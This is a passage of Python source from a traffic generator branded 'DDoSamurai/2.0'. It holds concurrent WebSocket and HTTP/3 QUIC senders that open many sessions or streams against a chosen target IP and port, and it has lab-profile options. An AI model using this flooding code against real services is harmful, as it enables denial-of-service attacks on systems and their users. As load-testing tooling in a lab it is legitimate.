    planned_sub_msgs = [str(getattr(item, "ws_subscribe_message", "") or "").strip() for item in planned_items]
    planned_ping_msgs = [str(getattr(item, "ws_ping_message", "") or "").strip() for item in planned_items]

    def _normalize_ws_path(path_val: str) -> str:
        p = str(path_val or "").strip()
        if not p:
            return str(ws_path or "/")
        if p.startswith("ws://") or p.startswith("wss://"):
            try:
                # Keep only resource path part when a full URL is provided.
                from urllib.parse import urlsplit
                parsed = urlsplit(p)
                if parsed.path:
                    p = parsed.path
            except Exception:
                pass
        if not p.startswith("/"):
            p = "/" + p
        return p
    c_fallback_reason = "none"
    if route.engine == "c_state":
        cfg = l7_c_adapter.make_config(
            target_ip=str(target_ip),
            target_port=int(target_port or 0),
            count=int(count or 0),
            concurrency=int(concurrency or 1),
            mode="websocket_stateful",
            extra={
                "scheme": "wss" if int(target_port or 0) == 443 else "ws",
                "ws_path": _normalize_ws_path(planned_paths[0] if planned_paths else ws_path),
                "ws_auth_message": str(auth_message or ""),
                "ws_subscribe_count": int(len(subscribe_messages or [])),
                "ws_subscribe_messages": "\x1f".join(str(m) for m in list(subscribe_messages or [])),
                "ws_ping_message": str(ping_message or "ping"),
                "ws_ping_count": int(ping_count or 0),
                "ws_await_response": bool(await_response),
                "ws_scenario_enabled": 1,
                "lab_profile": str(lab_profile or "off"),
                "l7_request_plan_count": int(len(planned_items)),
            },
        )
        c_res = await l7_c_adapter.run("ws", cfg)
        if l7_legacy.should_return_c_result(c_res, allow_python_fallback=route.allow_python_fallback):
            c_stats = l7_telemetry.normalize_l7_stats(
                c_res.as_stats(),
                attempted_default=count,
                sender_path="C_STATE_WS",
                engine_path_used=route.l7_engine_path_used,
                fallback_reason=str(getattr(c_res, "sender_fallback_reason", "none") or "none"),
            )
            c_stats.update(route.as_stats())
            _update_live(live_progress, int(c_stats.get("attempted", count) or 0))
            _update_live(live_sent, int(c_stats.get("sent", 0) or 0))
            _update_live(live_errors, int(c_stats.get("errors", 0) or 0))
            return _stats(**c_stats)
        c_fallback_reason = str(getattr(c_res, "sender_fallback_reason", "none") or "none")
        log_warning(
            "L7 c_state websocket engine unavailable/failed; "
            f"Python websocket path fallback enabled (reason={c_fallback_reason})."
        )

    if not WEBSOCKETS_AVAILABLE:
        log_error("WebSocket desteği için 'websockets' kütüphanesi yüklü değil.")
        return _stats(
            **_normalize_l7_output(
                {"attempted": count, "sent": 0, "errors": count, "sender_path": "PY_WS"},
                attempted_default=count,
                sender_path="PY_WS",
                engine_path_used="PY_WS",
                fallback_reason=c_fallback_reason,
                route=route,
            )
        )

    scheme = "wss" if target_port == 443 else "ws"
    base_ws_path = _normalize_ws_path(ws_path)
    session_paths = []
    session_auth_messages = []
    session_subscribe_messages = []
    session_ping_messages = []
    for idx in range(max(0, int(count or 0))):
        if planned_paths:
            session_paths.append(_normalize_ws_path(planned_paths[idx % len(planned_paths)]))
        else:
            session_paths.append(base_ws_path)
        plan_auth = planned_auth_msgs[idx % len(planned_auth_msgs)] if planned_auth_msgs else ""
        plan_sub = planned_sub_msgs[idx % len(planned_sub_msgs)] if planned_sub_msgs else ""
        plan_ping = planned_ping_msgs[idx % len(planned_ping_msgs)] if planned_ping_msgs else ""
        session_auth_messages.append(plan_auth if plan_auth else str(auth_message or ""))
        if plan_sub:
            session_subscribe_messages.append([plan_sub])
        else:
            session_subscribe_messages.append([str(m) for m in list(subscribe_messages or [])])
        session_ping_messages.append(plan_ping if plan_ping else str(ping_message or "ping"))
    uri = f"{scheme}://{target_ip}:{target_port}{base_ws_path}"
    log_info(
        f"WebSocket scenario sender initialized. URI: {uri}, Sessions: {count}, "
        f"gpu_plan_items={len(planned_items)}"
    )

    subscribe_messages = list(subscribe_messages or [])
    ping_count = max(0, int(ping_count or 0))

    sessions_ok = 0
    session_errors = 0
    auth_sent = 0
    subscribe_sent = 0
    ping_sent = 0
    pong_received = 0

    effective_concurrency = min(max(1, int(concurrency or 1)), count) if count > 0 else 1
    per_worker_base = count // effective_concurrency
    remainder = count % effective_concurrency

    def _worker_count(worker_id: int) -> int:
        return per_worker_base + (1 if worker_id < remainder else 0)

    worker_offsets = []
    _cursor = 0
    for i in range(effective_concurrency):
        worker_offsets.append(_cursor)
        _cursor += _worker_count(i)

    async def _maybe_recv(ws):
        nonlocal pong_received
        if not await_response:
            return
        _ = await asyncio.wait_for(ws.recv(), timeout=3.0)
        pong_received += 1

    async def _scenario_worker(worker_id: int):
        nonlocal sessions_ok, session_errors, auth_sent, subscribe_sent, ping_sent
        my_sessions = _worker_count(worker_id)
        base_index = int(worker_offsets[worker_id]) if worker_id < len(worker_offsets) else 0
        for session_local in range(my_sessions):
            session_idx = base_index + session_local
            session_path = session_paths[session_idx] if session_idx < len(session_paths) else base_ws_path
            session_uri = f"{scheme}://{target_ip}:{target_port}{session_path}"
            session_auth = session_auth_messages[session_idx] if session_idx < len(session_auth_messages) else str(auth_message or "")
            session_subs = session_subscribe_messages[session_idx] if session_idx < len(session_subscribe_messages) else list(subscribe_messages or [])
            session_ping = session_ping_messages[session_idx] if session_idx < len(session_ping_messages) else str(ping_message or "ping")
            _update_live(live_progress, 1)
            try:
                async with websockets.connect(session_uri, ssl=ssl_context) as websocket:
                    if session_auth:
                        await websocket.send(str(session_auth))
                        auth_sent += 1
                        await _maybe_recv(websocket)

                    for sub_msg in session_subs:
                        await websocket.send(str(sub_msg))
                        subscribe_sent += 1
                        await _maybe_recv(websocket)

                    for _ in range(ping_count):
                        await websocket.send(str(session_ping))
                        ping_sent += 1
                        await _maybe_recv(websocket)

                    sessions_ok += 1
                    _update_live(live_sent, 1)
            except Exception as exc:
                session_errors += 1
                _update_live(live_errors, 1)
                if verbose:
                    log_error(f"WS scenario failed: {exc}")

    tasks = [asyncio.create_task(_scenario_worker(i)) for i in range(effective_concurrency)]
    await asyncio.gather(*tasks)
    log_info(
        "WebSocket scenario finished. "
        f"sessions_ok={sessions_ok} errors={session_errors} auth={auth_sent} "
        f"sub={subscribe_sent} ping={ping_sent} pong={pong_received}"
    )
    py_stats = l7_telemetry.normalize_l7_stats(
        {
            "attempted": count,
            "sent": sessions_ok,
            "errors": max(session_errors, count - sessions_ok),
            "ws_sessions_ok": sessions_ok,
            "ws_auth_sent": auth_sent,
            "ws_subscribe_sent": subscribe_sent,
            "ws_ping_sent": ping_sent,
            "ws_pong_received": pong_received,
            "ws_scenario_enabled": 1,
            "sender_path": "PY_WS_SCENARIO",
            "l7_engine_path_used": "PY_WS",
            "l7_fallback_reason": c_fallback_reason,
            "l7_request_plan_used": int(bool(planned_items)),
            "l7_request_plan_items": int(len(planned_items)),
        },
        attempted_default=count,
        sender_path="PY_WS_SCENARIO",
        engine_path_used="PY_WS",
        fallback_reason=c_fallback_reason,
    )
    py_stats.update(route.as_stats())
    py_stats["l7_engine_path_used"] = "PY_WS"
    return _stats(**py_stats)

async def websocket_sender(target_ip, target_port, count, concurrency, ws_path, ws_message, verbose, ssl_context=None, live_sent=None, live_errors=None, live_progress=None):
    """
    Sends WebSocket messages/pings to the target.
    Fair count distribution: no remainder loss, no overconcurrency.
    """
    if not WEBSOCKETS_AVAILABLE:
        log_error("WebSocket desteği için 'websockets' kütüphanesi yüklü değil.")
        return _stats(attempted=count, sent=0, errors=count)

    scheme = "wss" if target_port == 443 else "ws"
    uri = f"{scheme}://{target_ip}:{target_port}{ws_path}"
    log_info(f"WebSocket sender initialized. URI: {uri}, Count: {count}")

    sent_msgs = 0
    errors = 0

    # Fair distribution: cap concurrency to count, distribute remainder
    effective_concurrency = min(max(1, concurrency), count) if count > 0 else 1
    per_worker_base = count // effective_concurrency
    remainder = count % effective_concurrency

    def _worker_count(worker_id):
        """First `remainder` workers get +1 message."""
        return per_worker_base + (1 if worker_id < remainder else 0)

    async def _ws_worker(worker_id):
        nonlocal sent_msgs, errors
        my_count = _worker_count(worker_id)
        try:
            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                for _ in range(my_count):
                    _update_live(live_progress, 1)
                    await websocket.send(ws_message)
                    sent_msgs += 1
                    _update_live(live_sent, 1)
                    if verbose: log_info(f"WS message sent: {ws_message}")
                    await asyncio.sleep(0.01)
        except Exception as e:
            errors += 1
            _update_live(live_errors, 1)
            if verbose: log_error(f"WS connection failed: {e}")

    tasks = []
    for i in range(effective_concurrency):
        tasks.append(asyncio.create_task(_ws_worker(i)))

    await asyncio.gather(*tasks)
    log_info(f"WebSocket sender finished.")
    return _stats(attempted=count, sent=sent_msgs, errors=max(errors, count - sent_msgs))

async def quic_sender(
    target_ip,
    target_port,
    count,
    concurrency,
    quic_path,
    quic_method,
    verbose,
    ssl_context=None,
    retries=0,
    timeout_s=3.0,
    quic_verify=True,
    l7_quic_engine="python",
    l7_quic_require_native=False,
    l7_fallback_policy="allow",
    l7_capability_strict=False,
    lab_profile="off",
    quic_streams_per_conn=0,
    quic_requests_per_conn=0,
    quic_conn_pool_size=1,
    quic_expect_status_min=200,
    quic_expect_status_max=399,
    quic_require_response_headers=True,
    quic_require_response_body=False,
    quic_min_response_body_bytes=0,
    quic_expect_header_name="",
    quic_expect_header_value_contains="",
    quic_expect_body_substring="",
    request_plan: "H2RequestPlan | None" = None,
    live_sent=None,
    live_errors=None,
    live_progress=None,
):
    """
    Sends real HTTP/3 requests over QUIC using aioquic.
    Opens H3 streams, sends :method/:path pseudo-headers, reads responses.
    Correct count semantics: distributes `count` across `concurrency` workers.
    """
    route = l7_dispatch.build_route_decision(
        L7RouteRequest(
            protocol="quic",
            l7_engine="python",
            protocol_engine=str(l7_quic_engine or "auto"),
            fallback_policy=str(l7_fallback_policy or "allow"),
            capability_strict=bool(l7_capability_strict),
            legacy_path_enable=True,
            lab_profile=str(lab_profile or "off"),
        )
    )
    planned_items = list(getattr(request_plan, "items", []) or []) if request_plan is not None else []
    planned_methods = [str(getattr(item, "method", "") or "").strip().upper() for item in planned_items]
    planned_methods = [m for m in planned_methods if m]
    planned_paths = [str(getattr(item, "path", "") or "").strip() for item in planned_items]
    planned_paths = [p for p in planned_paths if p]
    planned_headers = [dict(getattr(item, "headers", {}) or {}) for item in planned_items]
    planned_bodies = [getattr(item, "body", None) for item in planned_items]
    planned_content_types = [str(getattr(item, "content_type", "") or "").strip() for item in planned_items]
    lab_profile_norm = str(lab_profile or "off").strip().lower()
    require_native_effective = bool(l7_quic_require_native) or (
        lab_profile_norm == "dedicated" and bool(l7_capability_strict)
    )
    c_fallback_reason = "none"
    verify_tls = bool(quic_verify and ssl_context is None)
    if require_native_effective and route.engine != "c_state":
        return _stats(
            **_normalize_l7_output(
                {
                    "attempted": count,
                    "sent": 0,
                    "errors": count,
                    "sender_path": "C_STATE_QUIC_NATIVE_REQUIRED",
                    "sender_fallback_reason": "quic_native_required_route_mismatch",
                },
                attempted_default=count,
                sender_path="C_STATE_QUIC_NATIVE_REQUIRED",
                engine_path_used=route.l7_engine_path_used,
                fallback_reason="quic_native_required_route_mismatch",
                route=route,
            )
        )

    if route.engine == "c_state":
        c_extra = {
            "quic_path": str(planned_paths[0] if planned_paths else (quic_path or "/")),
            "quic_method": str(planned_methods[0] if planned_methods else (quic_method or "GET")),
            "scheme": "https",
            "verify": bool(verify_tls),
            "require_native_quic": 1 if bool(require_native_effective) else 0,
            "retries": int(retries or 0),
            "timeout_s": float(timeout_s or 3.0),
            "quic_streams_per_conn": int(quic_streams_per_conn or 0),
            "quic_requests_per_conn": int(quic_requests_per_conn or 0),
            "quic_conn_pool_size": int(quic_conn_pool_size or 1),
            "quic_expect_status_min": int(quic_expect_status_min or 200),
            "quic_expect_status_max": int(quic_expect_status_max or 399),
            "quic_require_response_headers": 1 if bool(quic_require_response_headers) else 0,
            "quic_require_response_body": 1 if bool(quic_require_response_body) else 0,
            "quic_min_response_body_bytes": int(quic_min_response_body_bytes or 0),
            "quic_expect_header_name": str(quic_expect_header_name or ""),
            "quic_expect_header_value_contains": str(quic_expect_header_value_contains or ""),
            "quic_expect_body_substring": str(quic_expect_body_substring or ""),
            "l7_request_plan_count": int(len(planned_items)),
        }
        if require_native_effective:
            c_extra["enable_quic_py_bridge"] = 0
        c_cfg = l7_c_adapter.make_config(
            target_ip=str(target_ip),
            target_port=int(target_port or 0),
            count=int(count or 0),
            concurrency=int(concurrency or 1),
            mode="quic_stateful",
            extra=c_extra,
        )
        c_res = await l7_c_adapter.run("quic", c_cfg)
        if l7_legacy.should_return_c_result(
            c_res,
            allow_python_fallback=(route.allow_python_fallback and not bool(require_native_effective)),
        ):
            c_stats = _normalize_l7_output(
                c_res.as_stats(),
                attempted_default=count,
                sender_path="C_STATE_QUIC",
                engine_path_used=route.l7_engine_path_used,
                fallback_reason=str(getattr(c_res, "sender_fallback_reason", "none") or "none"),
                route=route,
            )
            _update_live(live_progress, int(c_stats.get("attempted", count) or 0))
            _update_live(live_sent, int(c_stats.get("sent", 0) or 0))
            _update_live(live_errors, int(c_stats.get("errors", 0) or 0))
            return _stats(**c_stats)
        c_fallback_reason = str(getattr(c_res, "sender_fallback_reason", "none") or "none")
        if require_native_effective:
            return _stats(
                **_normalize_l7_output(
                    c_res.as_stats(),
                    attempted_default=count,
                    sender_path="C_STATE_QUIC_NATIVE_REQUIRED",
                    engine_path_used=route.l7_engine_path_used,
                    fallback_reason=c_fallback_reason,
                    route=route,
                )
            )
        log_warning(
            "L7 c_state QUIC engine unavailable/failed; "
            f"Python QUIC path fallback enabled (reason={c_fallback_reason})."
        )

    if not AIOQUIC_AVAILABLE:
        log_error("QUIC/HTTP3 desteği için 'aioquic' kütüphanesi yüklü değil.")
        return _stats(
            **_normalize_l7_output(
                {"attempted": count, "sent": 0, "errors": count, "sender_path": "PY_QUIC"},
                attempted_default=count,
                sender_path="PY_QUIC",
                engine_path_used="PY_QUIC",
                fallback_reason=c_fallback_reason,
                route=route,
            )
        )

    log_info(
        f"QUIC sender initialized. Target: {target_ip}:{target_port}, Count: {count}, "
        f"Method: {quic_method}, Path: {quic_path}, gpu_plan_items={len(planned_items)}"
    )

    configuration = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    if ssl_context or not verify_tls:
        configuration.verify_mode = ssl.CERT_NONE

    ok_requests = 0
    err_requests = 0
    # Fair distribution (same pattern as websocket_sender)
    effective_concurrency = min(max(1, concurrency), count) if count > 0 else 1
    per_worker_base = count // effective_concurrency
    remainder = count % effective_concurrency

    def _worker_count(worker_id):
        return per_worker_base + (1 if worker_id < remainder else 0)

    def _normalize_quic_path(path_value: str) -> str:
        path_norm = str(path_value or "").strip()
        if not path_norm:
            return str(quic_path or "/")
        if not path_norm.startswith("/"):
            path_norm = "/" + path_norm
        return path_norm

    request_items = []
    for i in range(max(0, int(count or 0))):
        if planned_items:
            item = planned_items[i % len(planned_items)]
            method_i = str(getattr(item, "method", quic_method) or quic_method)
            path_i = str(getattr(item, "path", quic_path) or quic_path)
            headers_i = dict(planned_headers[i % len(planned_headers)] if planned_headers else {})
            plan_ua = str(getattr(item, "user_agent", "") or "").strip()
            if plan_ua and "user-agent" not in {str(k).lower() for k in headers_i.keys()}:
                headers_i["user-agent"] = plan_ua
            body_i = planned_bodies[i % len(planned_bodies)] if planned_bodies else None
            content_type_i = planned_content_types[i % len(planned_content_types)] if planned_content_types else ""
            if body_i is not None and content_type_i and "content-type" not in {str(k).lower() for k in headers_i.keys()}:
                headers_i["content-type"] = content_type_i
        else:
            method_i = str(quic_method or "GET")
            path_i = str(quic_path or "/")
            headers_i = {}
            body_i = None
        if body_i is None:
            body_bytes_i = b""
        elif isinstance(body_i, bytes):
            body_bytes_i = body_i
        else:
            body_bytes_i = str(body_i).encode("utf-8")
        request_items.append((method_i.upper(), _normalize_quic_path(path_i), headers_i, body_bytes_i))

    worker_offsets = []
    _cursor = 0
    for i in range(effective_concurrency):
        worker_offsets.append(_cursor)
        _cursor += _worker_count(i)

    async def _quic_worker(worker_id):
        nonlocal ok_requests, err_requests
        my_count = _worker_count(worker_id)
        if my_count <= 0:
            return
        start_idx = int(worker_offsets[worker_id]) if worker_id < len(worker_offsets) else 0
        try:
            async with connect(
                target_ip, target_port, configuration=configuration,
                create_protocol=H3Connection
            ) as protocol:
                h3_conn = protocol._quic  # underlying H3Connection
                for req_local in range(my_count):
                    _update_live(live_progress, 1)
                    try:
                        req_idx = start_idx + req_local
                        req_method, req_path, req_headers, req_body = request_items[req_idx] if req_idx < len(request_items) else (
                            str(quic_method or "GET").upper(),
                            _normalize_quic_path(str(quic_path or "/")),
                            {},
                            b"",
                        )
                        # Open a new stream and send H3 request headers
                        stream_id = h3_conn.get_next_available_stream_id()
                        h3_headers = [
                            (b":method", req_method.encode()),
                            (b":path", req_path.encode()),
                            (b":scheme", b"https"),
                            (b":authority", target_ip.encode() if isinstance(target_ip, str) else target_ip),
                            (b"user-agent", b"DDoSamurai/2.0"),
                        ]
                        for hk, hv in dict(req_headers or {}).items():
                            if hk is None or hv is None:
                                continue
                            hname = str(hk).strip().lower()
                            if not hname:
                                continue
                            if hname.startswith(":") or hname == "authority":
                                continue
                            if hname == "user-agent":
                                h3_headers = [x for x in h3_headers if x[0] != b"user-agent"]
                            h3_headers.append((hname.encode(), str(hv).encode()))
                        h3_conn.send_headers(
                            stream_id=stream_id,
                            headers=h3_headers,
                            end_stream=(len(req_body) == 0),
                        )
                        if req_body:
                            h3_conn.send_data(stream_id=stream_id, data=req_body, end_stream=True)
                        ok_requests += 1
                        _update_live(live_sent, 1)
                        if verbose:
                            log_info(f"H3 request sent: {req_method} {req_path} stream={stream_id}")
                        # Allow event loop to process
                        await asyncio.sleep(0)
                    except Exception as req_e:
                        err_requests += 1
                        _update_live(live_errors, 1)
                        if verbose:
                            log_error(f"H3 request failed: {req_e}")
        except Exception as e:
            # Connection-level failure — count remaining as errors
            conn_remaining = my_count
            err_requests += conn_remaining
            _update_live(live_errors, conn_remaining)
            if verbose:
                log_error(f"QUIC connection failed: {e}")

    tasks = []
    for i in range(effective_concurrency):
        tasks.append(asyncio.create_task(_quic_worker(i)))

    await asyncio.gather(*tasks)
    log_info(f"QUIC sender finished. ok={ok_requests} err={err_requests}")
    return _stats(
        **_normalize_l7_output(
            {
                "attempted": count,
                "sent": ok_requests,
                "errors": max(err_requests, count - ok_requests),
                "quic_stream_fail_ratio": float(max(err_requests, 0)) / float(max(1, int(count or 0))),
                "quic_handshake_fail_ratio": 0.0,
                "sender_path": "PY_QUIC",
                "l7_request_plan_used": int(bool(planned_items)),
                "l7_request_plan_items": int(len(planned_items)),
            },
            attempted_default=count,
            sender_path="PY_QUIC",
            engine_path_used="PY_QUIC",
            fallback_reason=c_fallback_reason,
            route=route,
        )
    )
